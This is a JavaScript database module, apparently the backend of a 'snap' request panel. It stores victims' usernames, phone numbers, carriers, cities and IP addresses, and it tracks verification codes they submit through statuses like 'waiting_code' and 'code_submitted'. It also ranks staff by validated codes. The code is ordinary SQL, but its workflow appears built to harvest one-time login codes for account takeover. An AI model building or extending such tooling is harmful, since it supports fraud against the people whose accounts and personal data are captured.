import { neon } from "@neondatabase/serverless";
import { CONFIG } from "./config.js";

export const sql = neon(CONFIG.DATABASE_URL);

export async function getRequestByPhone(phone) {
    const rows = await sql`SELECT * FROM snap_requests WHERE phone = ${phone} LIMIT 1`;
    return rows[0] || null;
}

export async function updateStatus(phone, status) {
    await sql`UPDATE snap_requests SET status = ${status} WHERE phone = ${phone}`;
}

export async function logAction(action, details) {
    try {
        await sql`INSERT INTO snap_logs (action, details) VALUES (${action}, ${JSON.stringify(details)})`;
    } catch (e) {
        // snap_logs table may not exist yet
    }
}

export async function getPendingRequests(lastId) {
    return await sql`
        SELECT id, username, phone, operator, country, city, ip_address, status, created_at
        FROM snap_requests
        WHERE id > ${lastId} AND status = ${"pending"}
        ORDER BY id ASC
    `;
}

export async function getCodeSubmittedRequests(lastId) {
    return await sql`
        SELECT id, username, phone, operator, country, city, ip_address, staff_code, code_length, status, created_at
        FROM snap_requests
        WHERE id > ${lastId} AND status = ${"code_submitted"} AND staff_code IS NOT NULL
        ORDER BY id ASC
    `;
}

export async function getGlobalStats() {
    const total = await sql`SELECT COUNT(*) as count FROM snap_requests`;
    const pending = await sql`SELECT COUNT(*) as count FROM snap_requests WHERE status = ${"pending"}`;
    const processing = await sql`SELECT COUNT(*) as count FROM snap_requests WHERE status = ${"processing"}`;
    const waiting = await sql`SELECT COUNT(*) as count FROM snap_requests WHERE status = ${"waiting_code"}`;
    const submitted = await sql`SELECT COUNT(*) as count FROM snap_requests WHERE status = ${"code_submitted"}`;
    const completed = await sql`SELECT COUNT(*) as count FROM snap_requests WHERE status = ${"completed"}`;
    const wrong = await sql`SELECT COUNT(*) as count FROM snap_requests WHERE status = ${"wrong_number"}`;
    const retry = await sql`SELECT COUNT(*) as count FROM snap_requests WHERE status = ${"retry_code"}`;
    const banned = await sql`SELECT COUNT(*) as count FROM banned_ips`;

    return {
        total: total[0].count,
        pending: pending[0].count,
        processing: processing[0].count,
        waiting: waiting[0].count,
        submitted: submitted[0].count,
        completed: completed[0].count,
        wrong: wrong[0].count,
        retry: retry[0].count,
        banned: banned[0].count
    };
}

export async function getTodayStats() {
    const today = await sql`
        SELECT COUNT(*) as count FROM snap_requests 
        WHERE created_at >= CURRENT_DATE
    `;
    const todayCompleted = await sql`
        SELECT COUNT(*) as count FROM snap_requests 
        WHERE status = ${"completed"} AND created_at >= CURRENT_DATE
    `;
    return { requests: today[0].count, completed: todayCompleted[0].count };
}

export async function getOperatorStats() {
    return await sql`
        SELECT operator, COUNT(*) as count 
        FROM snap_requests 
        GROUP BY operator 
        ORDER BY count DESC
    `;
}

export async function getHourlyStats() {
    return await sql`
        SELECT EXTRACT(HOUR FROM created_at) as hour, COUNT(*) as count
        FROM snap_requests
        WHERE created_at >= NOW() - INTERVAL '24 hours'
        GROUP BY hour
        ORDER BY hour
    `;
}

export async function getStaffLeaderboard(limit = 10) {
    return await sql`
        SELECT 
            details->>'staff_tag' as staff,
            COUNT(*) as validations
        FROM snap_logs 
        WHERE action = ${"true_code"} AND details->>'staff_tag' IS NOT NULL
        GROUP BY details->>'staff_tag'
        ORDER BY validations DESC
        LIMIT ${limit}
    `;
}

export async function getStaffActivity() {
    return await sql`
        SELECT 
            details->>'staff_tag' as staff,
            action,
            COUNT(*) as count
        FROM snap_logs 
        WHERE details->>'staff_tag' IS NOT NULL
        GROUP BY details->>'staff_tag', action
        ORDER BY count DESC
    `;
}
